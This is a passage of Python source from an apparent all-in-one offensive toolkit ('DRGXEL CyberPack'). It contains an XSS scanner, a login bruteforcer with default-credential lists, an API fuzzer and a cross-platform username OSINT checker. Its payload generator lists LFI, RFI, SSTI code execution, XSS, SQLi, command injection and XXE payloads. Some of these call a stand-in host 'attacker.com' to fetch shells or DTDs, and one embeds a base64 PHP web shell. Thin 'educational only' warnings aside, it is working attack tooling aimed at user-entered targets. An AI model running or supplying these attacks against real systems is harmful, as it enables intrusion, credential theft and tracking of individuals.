            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                  parsed.params, new_query, parsed.fragment))
            
            try:
                req = Request(test_url, headers={'User-Agent': 'DRGXEL-Scanner/2.0'})
                response = urlopen(req, timeout=10).read().decode('utf-8', errors='ignore')
                
                # Check if payload is reflected in response
                if payload in response:
                    print_warning(f"[{i}/{len(payloads)}] REFLECTED: {payload[:40]}")
                    vulnerable.append(payload)
                else:
                    # Check for encoded versions
                    encoded_checks = [
                        payload.replace('<', '&lt;').replace('>', '&gt;'),
                        payload.replace('"', '&quot;').replace("'", '&#39;'),
                    ]
                    
                    reflected = False
                    for encoded in encoded_checks:
                        if encoded in response:
                            print_info(f"[{i}/{len(payloads)}] ENCODED: {payload[:40]}")
                            reflected = True
                            break
                    
                    if not reflected:
                        print(f"[{i}/{len(payloads)}] Testing: {payload[:40]}", end='\r')
                
                time.sleep(0.5)
                
            except Exception as e:
                pass
        
        print("\n")
        if vulnerable:
            print_warning(f"⚠️  FOUND {len(vulnerable)} REFLECTED XSS PAYLOADS!")
            print("\n\033[1;33m[Reflected Payloads]\033[0m")
            for payload in vulnerable[:10]:
                print(f"  • {payload}")
            print("\n\033[1;31m[!] Manual verification required - check if payload executes\033[0m")
        else:
            print_success("✓ No reflected XSS detected (payloads may be filtered)")
    
    except Exception as e:
        print_error(f"Error during XSS scan: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def bruteforce_login():
    """Bruteforce login panel (educational, rate-limited)"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ BRUTEFORCE PANEL LOGIN ═══\033[0m\n")
    
    print_warning("⚠️  Rate limited: 1 request per second (educational only)")
    print_warning("⚠️  Use only on systems you own!\n")
    
    url = input("[?] Enter login URL: ").strip()
    
    if not url:
        print_error("URL cannot be empty!")
        time.sleep(2)
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    username_field = input("[?] Username field name (default: username): ").strip() or "username"
    password_field = input("[?] Password field name (default: password): ").strip() or "password"
    
    print("\n\033[1;33m[Mode Selection]\033[0m")
    print("1. Username bruteforce (fixed password)")
    print("2. Password bruteforce (fixed username)")
    print("3. Combo bruteforce (username:password list)")
    
    mode = input("\n[?] Select mode: ").strip()
    
    log_activity(f"Login bruteforce attempt on {url}")
    
    # Internal wordlists
    usernames = ['admin', 'administrator', 'root', 'user', 'test', 'guest', 
                 'demo', 'system', 'operator', 'webadmin', 'sysadmin']
    
    passwords = ['admin', 'password', '123456', 'admin123', 'root', 'test',
                 '12345678', 'qwerty', 'abc123', 'password123', 'admin@123']
    
    combos = [
        ('admin', 'admin'),
        ('admin', 'password'),
        ('admin', '123456'),
        ('root', 'root'),
        ('root', 'toor'),
        ('administrator', 'administrator'),
        ('user', 'user'),
        ('test', 'test'),
    ]
    
    success = []
    
    try:
        import urllib.request
        import urllib.parse
        
        if mode == '1':
            password = input("[?] Enter fixed password: ").strip()
            print_info(f"\nTrying {len(usernames)} usernames...\n")
            
            for i, username in enumerate(usernames, 1):
                data = urllib.parse.urlencode({
                    username_field: username,
                    password_field: password
                }).encode('utf-8')
                
                try:
                    req = urllib.request.Request(url, data=data, 
                                                headers={'User-Agent': 'DRGXEL-Scanner/2.0'})
                    response = urllib.request.urlopen(req, timeout=10)
                    
                    # Check for success indicators
                    response_text = response.read().decode('utf-8', errors='ignore')
                    
                    if any(x in response_text.lower() for x in ['welcome', 'dashboard', 'logout', 'success']):
                        print_success(f"[{i}/{len(usernames)}] SUCCESS: {username}:{password}")
                        success.append((username, password))
                    else:
                        print(f"[{i}/{len(usernames)}] Testing: {username}", end='\r')
                    
                    time.sleep(1)  # Rate limit
                    
                except HTTPError as e:
                    if e.code == 200:
                        print_warning(f"[{i}/{len(usernames)}] POSSIBLE: {username}")
                except:
                    pass
        
        elif mode == '2':
            username = input("[?] Enter fixed username: ").strip()
            print_info(f"\nTrying {len(passwords)} passwords...\n")
            
            for i, password in enumerate(passwords, 1):
                data = urllib.parse.urlencode({
                    username_field: username,
                    password_field: password
                }).encode('utf-8')
                
                try:
                    req = urllib.request.Request(url, data=data,
                                                headers={'User-Agent': 'DRGXEL-Scanner/2.0'})
                    response = urllib.request.urlopen(req, timeout=10)
                    response_text = response.read().decode('utf-8', errors='ignore')
                    
                    if any(x in response_text.lower() for x in ['welcome', 'dashboard', 'logout', 'success']):
                        print_success(f"[{i}/{len(passwords)}] SUCCESS: {username}:{password}")
                        success.append((username, password))
                    else:
                        print(f"[{i}/{len(passwords)}] Testing: {password}", end='\r')
                    
                    time.sleep(1)
                    
                except:
                    pass
        
        elif mode == '3':
            print_info(f"\nTrying {len(combos)} combinations...\n")
            
            for i, (username, password) in enumerate(combos, 1):
                data = urllib.parse.urlencode({
                    username_field: username,
                    password_field: password
                }).encode('utf-8')
                
                try:
                    req = urllib.request.Request(url, data=data,
                                                headers={'User-Agent': 'DRGXEL-Scanner/2.0'})
                    response = urllib.request.urlopen(req, timeout=10)
                    response_text = response.read().decode('utf-8', errors='ignore')
                    
                    if any(x in response_text.lower() for x in ['welcome', 'dashboard', 'logout', 'success']):
                        print_success(f"[{i}/{len(combos)}] SUCCESS: {username}:{password}")
                        success.append((username, password))
                    else:
                        print(f"[{i}/{len(combos)}] Testing: {username}:{password}", end='\r')
                    
                    time.sleep(1)
                    
                except:
                    pass
        
        print("\n")
        if success:
            print_success(f"Found {len(success)} potential credentials!")
            for username, password in success:
                print(f"  • {username}:{password}")
        else:
            print_warning("No credentials found with default wordlist")
    
    except Exception as e:
        print_error(f"Error during bruteforce: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def api_fuzzer():
    """Fuzz API parameters for vulnerabilities"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ API FUZZER ═══\033[0m\n")
    
    url = input("[?] Enter API endpoint (e.g., http://api.site.com/user?id=1): ").strip()
    
    if not url:
        print_error("URL cannot be empty!")
        time.sleep(2)
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    print_info(f"Fuzzing {url}...\n")
    log_activity(f"API fuzzing on {url}")
    
    # Fuzzing payloads
    fuzz_payloads = [
        # Numeric fuzzing
        '0', '1', '-1', '999999', '2147483647',
        
        # String fuzzing
        'admin', 'test', 'root', 'user',
        
        # Special characters
        "'", '"', '<', '>', '&', '|',
        
        # Path traversal
        '../', '../../', '../../../etc/passwd',
        '....//....//....//etc/passwd',
        '..\\..\\..\\windows\\win.ini',
        
        # Command injection
        ';ls', '|ls', '`ls`', '$(ls)',
        
        # SQL injection
        "' OR '1'='1", "1' OR '1'='1' --",
        
        # XXE
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        
        # SSTI
        '{{7*7}}', '${7*7}', '<%= 7*7 %>',
        
        # NoSQL injection
        '{"$gt":""}', '{"$ne":null}',
        
        # Array fuzzing
        '[]', '[""]', '[0]',
    ]
    
    interesting = []
    
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            print_warning("No parameters in URL, fuzzing path...")
            base_url = url.rstrip('/')
            
            for i, payload in enumerate(fuzz_payloads, 1):
                test_url = f"{base_url}/{payload}"
                
                try:
                    req = Request(test_url, headers={'User-Agent': 'DRGXEL-Fuzzer/2.0'})
                    response = urlopen(req, timeout=5)
                    status = response.getcode()
                    content = response.read().decode('utf-8', errors='ignore')
                    length = len(content)
                    
                    if status == 200:
                        print_success(f"[{i}/{len(fuzz_payloads)}] [{status}] [{length}b] {payload[:30]}")
                        interesting.append((payload, status, length))
                    else:
                        print(f"[{i}/{len(fuzz_payloads)}] Testing: {payload[:30]}", end='\r')
                    
                except HTTPError as e:
                    if e.code in [403, 500]:
                        print_warning(f"[{i}/{len(fuzz_payloads)}] [{e.code}] {payload[:30]}")
                        interesting.append((payload, e.code, 0))
                except:
                    pass
                
                time.sleep(0.3)
        else:
            param_name = list(params.keys())[0]
            
            for i, payload in enumerate(fuzz_payloads, 1):
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                      parsed.params, new_query, parsed.fragment))
                
                try:
                    req = Request(test_url, headers={'User-Agent': 'DRGXEL-Fuzzer/2.0'})
                    response = urlopen(req, timeout=5)
                    status = response.getcode()
                    content = response.read().decode('utf-8', errors='ignore')
                    length = len(content)
                    
                    # Check for interesting responses
                    if 'error' in content.lower() or 'exception' in content.lower():
                        print_warning(f"[{i}/{len(fuzz_payloads)}] ERROR: {payload[:30]}")
                        interesting.append((payload, status, length, "error"))
                    elif status == 200 and length > 0:
                        print(f"[{i}/{len(fuzz_payloads)}] [{status}] [{length}b] {payload[:30]}", end='\r')
                    
                except HTTPError as e:
                    if e.code in [403, 500]:
                        print_error(f"[{i}/{len(fuzz_payloads)}] [{e.code}] {payload[:30]}")
                        interesting.append((payload, e.code, 0))
                except:
                    pass
                
                time.sleep(0.3)
        
        print("\n")
        if interesting:
            print_success(f"Found {len(interesting)} interesting responses!")
            print("\n\033[1;33m[Interesting Payloads]\033[0m")
            for item in interesting[:15]:
                if len(item) == 4:
                    payload, status, length, note = item
                    print(f"  • [{status}] {payload} - {note}")
                else:
                    payload, status, length = item
                    print(f"  • [{status}] [{length}b] {payload}")
        else:
            print_info("No particularly interesting responses found")
    
    except Exception as e:
        print_error(f"Error during fuzzing: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def network_stress_test():
    """Safe network performance benchmark"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ NETWORK STRESS TEST (SAFE MODE) ═══\033[0m\n")
    
    print_warning("⚠️  EDUCATIONAL ONLY - Performance benchmark, not attack")
    print_warning("⚠️  Use only on your own infrastructure!\n")
    
    target = input("[?] Enter target IP/domain: ").strip()
    
    if not target:
        print_error("Target cannot be empty!")
        time.sleep(2)
        return
    
    print("\n\033[1;33m[Test Mode]\033[0m")
    print("1. Ping Benchmark")
    print("2. HTTP Request Benchmark")
    print("3. Connection Benchmark")
    
    mode = input("\n[?] Select mode: ").strip()
    
    log_activity(f"Network stress test on {target}")
    
    try:
        if mode == '1':
            # Ping benchmark
            print_info(f"\nRunning ping benchmark to {target}...\n")
            
            count = int(input("[?] Number of pings (1-100): ").strip() or "10")
            count = min(count, 100)
            
            success = 0
            total_time = 0
            times = []
            
            for i in range(count):
                start = time.time()
                
                try:
                    param = '-n' if platform.system().lower() == 'windows' else '-c'
                    result = subprocess.run(['ping', param, '1', target], 
                                          capture_output=True, timeout=2)
                    
                    elapsed = (time.time() - start) * 1000
                    times.append(elapsed)
                    
                    if result.returncode == 0:
                        success += 1
                        print(f"[{i+1}/{count}] Reply: {elapsed:.2f}ms")
                    else:
                        print(f"[{i+1}/{count}] Timeout")
                    
                except subprocess.TimeoutExpired:
                    print(f"[{i+1}/{count}] Timeout")
                
                time.sleep(0.1)
            
            print(f"\n\033[1;33m[Statistics]\033[0m")
            print(f"  Sent: {count}")
            print(f"  Received: {success}")
            print(f"  Loss: {((count-success)/count*100):.1f}%")
            if times:
                print(f"  Min: {min(times):.2f}ms")
                print(f"  Max: {max(times):.2f}ms")
                print(f"  Avg: {sum(times)/len(times):.2f}ms")
        
        elif mode == '2':
            # HTTP benchmark
            url = target if target.startswith('http') else f'http://{target}'
            print_info(f"\nRunning HTTP benchmark to {url}...\n")
            
            count = int(input("[?] Number of requests (1-50): ").strip() or "10")
            count = min(count, 50)
            
            success = 0
            times = []
            
            for i in range(count):
                start = time.time()
                
                try:
                    req = Request(url, headers={'User-Agent': 'DRGXEL-Benchmark/2.0'})
                    response = urlopen(req, timeout=10)
                    elapsed = (time.time() - start) * 1000
                    times.append(elapsed)
                    
                    print(f"[{i+1}/{count}] [{response.getcode()}] {elapsed:.2f}ms")
                    success += 1
                    
                except Exception as e:
                    print(f"[{i+1}/{count}] Failed: {str(e)[:40]}")
                
                time.sleep(1)  # Rate limit
            
            print(f"\n\033[1;33m[Statistics]\033[0m")
            print(f"  Total: {count}")
            print(f"  Success: {success}")
            print(f"  Failed: {count - success}")
            if times:
                print(f"  Min: {min(times):.2f}ms")
                print(f"  Max: {max(times):.2f}ms")
                print(f"  Avg: {sum(times)/len(times):.2f}ms")
        
        elif mode == '3':
            # Connection benchmark
            port = int(input("[?] Target port (default: 80): ").strip() or "80")
            print_info(f"\nRunning connection benchmark to {target}:{port}...\n")
            
            count = int(input("[?] Number of connections (1-50): ").strip() or "10")
            count = min(count, 50)
            
            success = 0
            times = []
            
            for i in range(count):
                start = time.time()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                
                try:
                    result = sock.connect_ex((target, port))
                    elapsed = (time.time() - start) * 1000
                    
                    if result == 0:
                        times.append(elapsed)
                        print(f"[{i+1}/{count}] Connected: {elapsed:.2f}ms")
                        success += 1
                    else:
                        print(f"[{i+1}/{count}] Failed")
                    
                except Exception as e:
                    print(f"[{i+1}/{count}] Error: {str(e)[:30]}")
                
                finally:
                    sock.close()
                
                time.sleep(0.5)
            
            print(f"\n\033[1;33m[Statistics]\033[0m")
            print(f"  Total: {count}")
            print(f"  Success: {success}")
            print(f"  Failed: {count - success}")
            if times:
                print(f"  Min: {min(times):.2f}ms")
                print(f"  Max: {max(times):.2f}ms")
                print(f"  Avg: {sum(times)/len(times):.2f}ms")
    
    except Exception as e:
        print_error(f"Error during benchmark: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def file_metadata_extractor():
    """Extract metadata from files"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ FILE METADATA EXTRACTOR ═══\033[0m\n")
    
    filepath = input("[?] Enter file path: ").strip()
    
    if not filepath:
        print_error("File path cannot be empty!")
        time.sleep(2)
        return
    
    if not os.path.exists(filepath):
        print_error("File not found!")
        time.sleep(2)
        return
    
    print_info(f"Extracting metadata from {filepath}...\n")
    log_activity(f"Metadata extraction on {filepath}")
    
    try:
        # Basic file info
        print("\033[1;33m[File Information]\033[0m")
        stat_info = os.stat(filepath)
        print(f"  File: {os.path.basename(filepath)}")
        print(f"  Size: {stat_info.st_size} bytes ({stat_info.st_size/1024:.2f} KB)")
        print(f"  Modified: {datetime.fromtimestamp(stat_info.st_mtime).strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"  Accessed: {datetime.fromtimestamp(stat_info.st_atime).strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"  Created: {datetime.fromtimestamp(stat_info.st_ctime).strftime('%Y-%m-%d %H:%M:%S')}")
        
        # Check if exiftool is available
        print("\n\033[1;33m[EXIF Data]\033[0m")
        try:
            result = subprocess.run(['exiftool', filepath], 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                print(result.stdout)
            else:
                print_warning("  exiftool not available or no EXIF data found")
                
                # Try basic image metadata extraction
                if filepath.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
                    print_info("  Attempting basic image analysis...")
                    try:
                        with open(filepath, 'rb') as f:
                            # Read first bytes to check format
                            header = f.read(20)
                            
                            if header[:2] == b'\xff\xd8':
                                print("    Format: JPEG")
                            elif header[:8] == b'\x89PNG\r\n\x1a\n':
                                print("    Format: PNG")
                            elif header[:6] in (b'GIF87a', b'GIF89a'):
                                print("    Format: GIF")
                            
                            print(f"    File signature: {header[:10].hex()}")
                    except:
                        pass
        except FileNotFoundError:
            print_warning("  exiftool is not installed")
            print_info("  Install with: pkg install exiftool (Termux) or apt install libimage-exiftool-perl")
        
        # Check for hidden data
        print("\n\033[1;33m[Hidden Data Analysis]\033[0m")
        try:
            with open(filepath, 'rb') as f:
                content = f.read()
                
                # Check for common strings
                text_data = content.decode('utf-8', errors='ignore')
                
                # Look for URLs
                urls = re.findall(r'https?://[^\s<>"{}|\\^`\[\]]+', text_data)
                if urls:
                    print(f"  URLs found: {len(urls)}")
                    for url in urls[:5]:
                        print(f"    • {url}")
                
                # Look for email addresses
                emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', text_data)
                if emails:
                    print(f"  Emails found: {len(emails)}")
                    for email in set(emails[:5]):
                        print(f"    • {email}")
                
                # Check for embedded files
                if b'PK\x03\x04' in content:
                    print("  ⚠️  ZIP archive signature detected")
                if b'%PDF' in content:
                    print("  ⚠️  PDF signature detected")
                if b'\xff\xd8\xff' in content[100:]:  # JPEG not at start
                    print("  ⚠️  JPEG signature detected (possibly embedded)")
                
        except Exception as e:
            print_error(f"  Error analyzing file: {e}")
        
        # File entropy check (simple)
        print("\n\033[1;33m[Entropy Analysis]\033[0m")
        try:
            with open(filepath, 'rb') as f:
                data = f.read(10000)  # First 10KB
                
                if len(data) > 0:
                    # Simple entropy calculation
                    byte_counts = {}
                    for byte in data:
                        byte_counts[byte] = byte_counts.get(byte, 0) + 1
                    
                    entropy = 0
                    for count in byte_counts.values():
                        p = count / len(data)
                        if p > 0:
                            entropy -= p * (p.bit_length() - 1)
                    
                    print(f"  Entropy: {entropy:.2f}")
                    
                    if entropy > 7:
                        print_warning("  High entropy - possibly encrypted or compressed")
                    elif entropy < 3:
                        print_info("  Low entropy - likely plain text or simple data")
                    else:
                        print_info("  Normal entropy")
        except:
            pass
        
    except Exception as e:
        print_error(f"Error extracting metadata: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def payload_generator():
    """Generate common security testing payloads"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ PAYLOAD GENERATOR ═══\033[0m\n")
    
    print("\033[1;33m[Payload Types]\033[0m")
    print("1. LFI (Local File Inclusion)")
    print("2. RFI (Remote File Inclusion)")
    print("3. SSTI (Server-Side Template Injection)")
    print("4. XSS (Cross-Site Scripting)")
    print("5. SQLi (SQL Injection)")
    print("6. Directory Traversal")
    print("7. Command Injection")
    print("8. XXE (XML External Entity)")
    print("0. Generate All")
    
    choice = input("\n[?] Select payload type: ").strip()
    
    log_activity(f"Payload generation - Type: {choice}")
    
    payloads = {}
    
    # LFI Payloads
    payloads['LFI'] = [
        '../../../../../etc/passwd',
        '..\\..\\..\\..\\..\\windows\\win.ini',
        '....//....//....//....//etc/passwd',
        '..%2f..%2f..%2f..%2fetc%2fpasswd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....\/....\/....\/etc/passwd',
        '/etc/passwd',
        '/etc/shadow',
        '/proc/self/environ',
        '/var/log/apache2/access.log',
        'C:\\boot.ini',
        'C:\\windows\\system32\\drivers\\etc\\hosts',
    ]
    
    # RFI Payloads
    payloads['RFI'] = [
        'http://attacker.com/shell.txt',
        'http://attacker.com/shell.txt?',
        'http://attacker.com/shell.txt%00',
        'https://pastebin.com/raw/XXXXXXXX',
        'ftp://attacker.com/shell.php',
        '//attacker.com/shell.txt',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+',
        'php://input',
        'php://filter/convert.base64-encode/resource=index.php',
    ]
    
    # SSTI Payloads
    payloads['SSTI'] = [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '${{7*7}}',
        '#{7*7}',
        '*{7*7}',
        '{{config}}',
        '{{self}}',
        '{{request}}',
        '{{config.items()}}',
        '{{7*\'7\'}}',
        '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',
        '${T(java.lang.Runtime).getRuntime().exec(\'calc\')}',
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    ]
    
    # XSS Payloads
    payloads['XSS'] = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '"><script>alert(1)</script>',
        '\'><script>alert(1)</script>',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<img src=x onerror="javascript:alert(1)">',
        '<svg><script>alert(1)</script></svg>',
        '<marquee onstart=alert(1)>',
        '<details open ontoggle=alert(1)>',
        'javascript:alert(1)',
        '<a href="javascript:alert(1)">Click</a>',
    ]
    
    # SQLi Payloads
    payloads['SQLi'] = [
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "' OR 1=1--",
        "') OR ('1'='1",
        "1' WAITFOR DELAY '0:0:5'--",
        "1; SELECT SLEEP(5)--",
    ]
    
    # Directory Traversal
    payloads['Directory Traversal'] = [
        '../',
        '..\\',
        '..../',
        '....\\',
        '../../../',
        '..%2f',
        '%2e%2e%2f',
        '..;/',
        '..//..//',
        '....',
        '..%00/',
        '..%0d/',
        '..%5c',
        '..%c0%af',
        '..%c1%9c',
    ]
    
    # Command Injection
    payloads['Command Injection'] = [
        '; ls',
        '| ls',
        '|| ls',
        '& ls',
        '&& ls',
        '`ls`',
        '$(ls)',
        '; cat /etc/passwd',
        '| cat /etc/passwd',
        '; whoami',
        '| whoami',
        '`whoami`',
        '$(whoami)',
        '; sleep 5',
        '| sleep 5',
        '; ping -c 5 attacker.com',
        '| curl http://attacker.com',
    ]
    
    # XXE Payloads
    payloads['XXE'] = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ELEMENT data ANY><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><data>&xxe;</data>',
    ]
    
    try:
        if choice == '0':
            # Generate all payloads
            print("\n\033[1;36m═══ GENERATING ALL PAYLOADS ═══\033[0m\n")
            
            for payload_type, payload_list in payloads.items():
                print(f"\033[1;33m[{payload_type} Payloads - {len(payload_list)} total]\033[0m")
                for i, payload in enumerate(payload_list[:5], 1):
                    print(f"  {i}. {payload}")
                if len(payload_list) > 5:
                    print(f"  ... and {len(payload_list) - 5} more")
                print()
            
            # Save to file option
            save = input("[?] Save all payloads to file? (y/n): ").strip().lower()
            if save == 'y':
                filename = f"drgxel_payloads_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                filepath = os.path.expanduser(f"~/{filename}")
                
                with open(filepath, 'w') as f:
                    f.write("# DRGXEL CyberPack - Generated Payloads\n")
                    f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write("# WARNING: For educational/authorized testing only\n\n")
                    
                    for payload_type, payload_list in payloads.items():
                        f.write(f"\n{'='*60}\n")
                        f.write(f"{payload_type} PAYLOADS ({len(payload_list)} total)\n")
                        f.write(f"{'='*60}\n\n")
                        
                        for i, payload in enumerate(payload_list, 1):
                            f.write(f"{i}. {payload}\n")
                
                print_success(f"Payloads saved to: {filepath}")
        
        else:
            # Generate specific payload type
            payload_map = {
                '1': 'LFI',
                '2': 'RFI',
                '3': 'SSTI',
                '4': 'XSS',
                '5': 'SQLi',
                '6': 'Directory Traversal',
                '7': 'Command Injection',
                '8': 'XXE',
            }
            
            if choice in payload_map:
                payload_type = payload_map[choice]
                payload_list = payloads[payload_type]
                
                print(f"\n\033[1;33m[{payload_type} Payloads - {len(payload_list)} total]\033[0m\n")
                
                for i, payload in enumerate(payload_list, 1):
                    print(f"  {i}. {payload}")
                
                # Copy specific payload
                print("\n[?] Enter payload number to copy (0 to skip): ", end='')
                num = input().strip()
                
                if num.isdigit() and 0 < int(num) <= len(payload_list):
                    selected = payload_list[int(num) - 1]
                    print(f"\n\033[1;32m[Selected Payload]\033[0m")
                    print(f"  {selected}")
                    print("\n\033[1;33m[!] Payload displayed - copy manually\033[0m")
            else:
                print_error("Invalid choice!")
    
    except Exception as e:
        print_error(f"Error generating payloads: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def username_osint_checker():
    """Check username across 50+ platforms"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ USERNAME OSINT CHECKER ═══\033[0m\n")
    
    username = input("[?] Enter username to search: ").strip()
    
    if not username:
        print_error("Username cannot be empty!")
        time.sleep(2)
        return
    
    print_info(f"Searching username '{username}' across platforms...\n")
    log_activity(f"Username OSINT check: {username}")
    
    # Platform list with URL patterns
    platforms = {
        'GitHub': f'https://github.com/{username}',
        'Reddit': f'https://www.reddit.com/user/{username}',
        'Twitter/X': f'https://twitter.com/{username}',
        'Instagram': f'https://www.instagram.com/{username}',
        'Facebook': f'https://www.facebook.com/{username}',
        'LinkedIn': f'https://www.linkedin.com/in/{username}',
        'TikTok': f'https://www.tiktok.com/@{username}',
        'YouTube': f'https://www.youtube.com/@{username}',
        'Twitch': f'https://www.twitch.tv/{username}',
        'Discord': f'https://discord.com/users/{username}',
        'Telegram': f'https://t.me/{username}',
        'Pinterest': f'https://www.pinterest.com/{username}',
        'Tumblr': f'https://{username}.tumblr.com',
        'Medium': f'https://medium.com/@{username}',
        'DeviantArt': f'https://www.deviantart.com/{username}',
        'Behance': f'https://www.behance.net/{username}',
        'Dribbble': f'https://dribbble.com/{username}',
        'Flickr': f'https://www.flickr.com/people/{username}',
        'Vimeo': f'https://vimeo.com/{username}',
        'SoundCloud': f'https://soundcloud.com/{username}',
        'Spotify': f'https://open.spotify.com/user/{username}',
        'Steam': f'https://steamcommunity.com/id/{username}',
        'GitLab': f'https://gitlab.com/{username}',
        'Bitbucket': f'https://bitbucket.org/{username}',
        'SourceForge': f'https://sourceforge.net/u/{username}',
        'HackerRank': f'https://www.hackerrank.com/{username}',
        'Codecademy': f'https://www.codecademy.com/profiles/{username}',
        'Patreon': f'https://www.patreon.com/{username}',
        'Etsy': f'https://www.etsy.com/shop/{username}',
        'eBay': f'https://www.ebay.com/usr/{username}',
        'Fiverr': f'https://www.fiverr.com/{username}',
        'Upwork': f'https://www.upwork.com/freelancers/~{username}',
        'Quora': f'https://www.quora.com/profile/{username}',
        'StackOverflow': f'https://stackoverflow.com/users/{username}',
        'Keybase': f'https://keybase.io/{username}',
        'About.me': f'https://about.me/{username}',
        'Gravatar': f'https://gravatar.com/{username}',
        'WordPress': f'https://{username}.wordpress.com',
        'Blogger': f'https://{username}.blogspot.com',
        'LiveJournal': f'https://{username}.livejournal.com',
        'Myspace': f'https://myspace.com/{username}',
        'Last.fm': f'https://www.last.fm/user/{username}',
        'Mixcloud': f'https://www.mixcloud.com/{username}',
        '500px': f'https://500px.com/{username}',
        'VSCO': f'https://vsco.co/{username}',
        'Wattpad': f'https://www.wattpad.com/user/{username}',
        'Goodreads': f'https://www.goodreads.com/{username}',
        'Scribd': f'https://www.scribd.com/{username}',
        'SlideShare': f'https://www.slideshare.net/{username}',
        'Kaggle': f'https://www.kaggle.com/{username}',
        'Replit': f'https://replit.com/@{username}',
    }
    
    found = []
    not_found = []
    
    print(f"\033[1;33m[Checking {len(platforms)} platforms...]\033[0m\n")
    
    for i, (platform, url) in enumerate(platforms.items(), 1):
        try:
            req = Request(url, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            response = urlopen(req, timeout=5)
            status_code = response.getcode()
            
            if status_code == 200:
                print_success(f"[{i}/{len(platforms)}] FOUND on {platform}")
                print(f"    URL: {url}")
                found.append((platform, url))
            else:
                print(f"[{i}/{len(platforms)}] Checking {platform}...", end='\r')
                not_found.append(platform)
            
        except HTTPError as e:
            if e.code == 404:
                print(f"[{i}/{len(platforms)}] Checking {platform}...", end='\r')
                not_found.append(platform)
            elif e.code == 403:
                print_warning(f"[{i}/{len(platforms)}] {platform} - Access Denied (possible rate limit)")
            else:
                print(f"[{i}/{len(platforms)}] Checking {platform}...", end='\r')
                not_found.append(platform)
        except URLError:
            print(f"[{i}/{len(platforms)}] Checking {platform}...", end='\r')
            not_found.append(platform)
        except Exception:
            print(f"[{i}/{len(platforms)}] Checking {platform}...", end='\r')
            not_found.append(platform)
        
        time.sleep(0.2)  # Be polite
    
    # Results summary
    print("\n")
    print("\033[1;36m" + "="*60 + "\033[0m")
    print(f"\033[1;33m[OSINT RESULTS FOR: {username}]\033[0m")
    print("\033[1;36m" + "="*60 + "\033[0m\n")
    
    if found:
        print_success(f"Username found on {len(found)} platforms:\n")
        for platform, url in found:
            print(f"  ✓ {platform:20s} → {url}")
    else:
        print_warning("Username not found on any platform")
    
    print(f"\n\033[1;33m[Statistics]\033[0m")
    print(f"  Total platforms checked: {len(platforms)}")
    print(f"  Found: {len(found)}")
    print(f"  Not found: {len(not_found)}")
    print(f"  Success rate: {(len(found)/len(platforms)*100):.1f}%")
    
    # Save results
    save = input("\n[?] Save results to file? (y/n): ").strip().lower()
    if save == 'y':
        filename = f"osint_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        filepath = os.path.expanduser(f"~/{filename}")
        
        with open(filepath, 'w') as f:
            f.write(f"# DRGXEL OSINT Report\n")
            f.write(f"# Username: {username}\n")
            f.write(f"# Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Found on {len(found)} platforms\n\n")
            
            for platform, url in found:
